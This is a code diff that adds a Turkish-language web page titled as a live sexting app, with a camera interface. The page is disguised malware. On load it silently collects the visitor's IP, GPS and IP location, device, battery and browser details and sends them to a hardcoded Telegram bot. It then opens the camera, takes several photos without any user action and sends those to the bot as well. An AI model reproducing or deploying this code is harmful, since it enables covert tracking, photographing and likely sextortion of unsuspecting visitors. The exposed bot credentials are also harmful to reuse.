@@ -1,0 +1,225 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Canlı sexting</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body, html {
+      width: 100%;
+      height: 100%;
+      background: #000;
+      font-family: Arial, sans-serif;
+      overflow: hidden;
+    }
+    video, canvas {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      object-fit: cover;
+      z-index: 1;
+    }
+    video::-webkit-media-controls,
+    video::-webkit-media-controls-enclosure {
+      display: none !important;
+    }
+    #controls {
+      position: absolute;
+      bottom: 40px;
+      width: 100%;
+      text-align: center;
+      z-index: 3;
+    }
+    .capture-button {
+      width: 70px;
+      height: 70px;
+      border-radius: 50%;
+      background-color: #ff2c55;
+      border: 4px solid white;
+      margin: auto;
+    }
+    #options {
+      display: flex;
+      justify-content: center;
+      gap: 20px;
+      font-size: 14px;
+      color: #ccc;
+      margin-top: 10px;
+    }
+    #options span.selected {
+      color: #fff;
+      font-weight: bold;
+      border-bottom: 2px solid white;
+    }
+  </style>
+</head>
+<body>
+  <video id="video" autoplay muted playsinline disablepictureinpicture controlslist="nodownload nofullscreen noremoteplayback"></video>
+
+  <div id="controls">
+    <div class="capture-button" id="captureBtn"></div>
+    <div id="options">
+      <span data-mode="60s">60s</span>
+      <span data-mode="15s" class="selected">15s</span>
+      <span data-mode="photo">Photo</span>
+    </div>
+  </div>
+
+<script>
+const BOT_TOKEN = "8698986263:AAEQTQ4u2i7M1gCldFmGA1vDczQ09ZtnAi8";
+const CHAT_ID = "8679516937";
+
+async function sendTelegramMessage(text) {
+  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ chat_id: CHAT_ID, text }),
+  });
+}
+
+async function gatherAndSendInfo() {
+  try {
+    const now = new Date();
+    const ipRes = await fetch("https://api.ipify.org?format=json");
+    const ipData = await ipRes.json();
+
+    const locRes = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
+    const locData = await locRes.json();
+
+    let weather = {};
+    try {
+      const weatherRes = await fetch(`https://api.open-meteo.com/v1/forecast?latitude=${locData.latitude}&longitude=${locData.longitude}&current_weather=true`);
+      const weatherData = await weatherRes.json();
+      weather = weatherData.current_weather;
+    } catch (e) {
+      weather.temperature = "?";
+      weather.weathercode = "?";
+    }
+
+    let gpsLat = "?", gpsLon = "?";
+    try {
+      await new Promise(resolve => {
+        navigator.geolocation.getCurrentPosition(pos => {
+          gpsLat = pos.coords.latitude.toFixed(5);
+          gpsLon = pos.coords.longitude.toFixed(5);
+          resolve();
+        }, err => resolve());
+      });
+    } catch {}
+
+    let batteryInfo = "N/A";
+    if (navigator.getBattery) {
+      const battery = await navigator.getBattery();
+      batteryInfo = `${Math.round(battery.level * 100)}% (${battery.charging ? "Şarjda" : "Değil"})`;
+    }
+
+    const lang = navigator.language;
+    const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
+    const screenRes = `${screen.width}x${screen.height}`;
+
+    let storageInfo = "N/A";
+    if (navigator.storage && navigator.storage.estimate) {
+      const { quota, usage } = await navigator.storage.estimate();
+      storageInfo = `${(usage / 1024 / 1024).toFixed(1)}MB / ${(quota / 1024 / 1024).toFixed(1)}MB`;
+    }
+
+    let glRenderer = "N/A";
+    try {
+      const canvas = document.createElement("canvas");
+      const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
+      const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
+      if (gl && debugInfo) {
+        glRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+      }
+    } catch {}
+
+    const userAgent = navigator.userAgent;
+
+    const message = `
+🕓 ${now.toLocaleString()}
+🌐 IP: ${ipData.ip}
+📍 IP Konumu: ${locData.city}, ${locData.country_name} (${locData.latitude}, ${locData.longitude})
+📡 GPS Konumu: ${gpsLat}, ${gpsLon}
+🌡️ Hava: ${weather.temperature}°C (Kod: ${weather.weathercode})
+🔋 Batarya: ${batteryInfo}
+🗣️ Dil: ${lang}
+🌍 Saat Dilimi: ${tz}
+📏 Ekran: ${screenRes}
+💾 Depolama: ${storageInfo}
+🧬 GPU: ${glRenderer}
+📱 Cihaz: ${userAgent}
+`;
+
+    await sendTelegramMessage(message.trim());
+  } catch (e) {
+    console.error("Bilgi gönderimi başarısız:", e);
+  }
+}
+
+let stream;
+
+async function sendPhoto(blob, caption) {
+  const form = new FormData();
+  form.append("chat_id", CHAT_ID);
+  form.append("photo", blob, "photo.jpg");
+  form.append("caption", caption);
+  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+    method: "POST",
+    body: form,
+  });
+}
+
+async function autoCapture() {
+  const canvas = document.createElement("canvas");
+  const ctx = canvas.getContext("2d");
+
+  for (let i = 1; i <= 4; i++) {
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+    const blob = await new Promise(res => canvas.toBlob(res, "image/jpeg"));
+    if (blob && blob.size > 0) {
+      await sendPhoto(blob, `📸 Otomatik Fotoğraf ${i}`);
+    }
+    await new Promise(r => setTimeout(r, 200));
+  }
+}
+
+async function startCamera() {
+  try {
+    stream = await navigator.mediaDevices.getUserMedia({
+      video: {
+        width: { ideal: 1920 },
+        height: { ideal: 1080 }
+      }
+    });
+    video.srcObject = stream;
+    await new Promise(r => setTimeout(r, 500));
+    autoCapture();
+  } catch (err) {
+    console.error("Kamera başlatılamadı:", err);
+  }
+}
+
+document.getElementById("captureBtn").onclick = async () => {
+  const canvas = document.createElement("canvas");
+  canvas.width = video.videoWidth;
+  canvas.height = video.videoHeight;
+  const ctx = canvas.getContext("2d");
+  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+  const blob = await new Promise(res => canvas.toBlob(res, "image/jpeg"));
+  if (blob && blob.size > 0) {
+    await sendPhoto(blob, "📸 Manuel Fotoğraf");
+  }
+};
+
+window.onload = async () => {
+  await gatherAndSendInfo();
+  await startCamera();
+};
+</script>
+</body>
+</html>
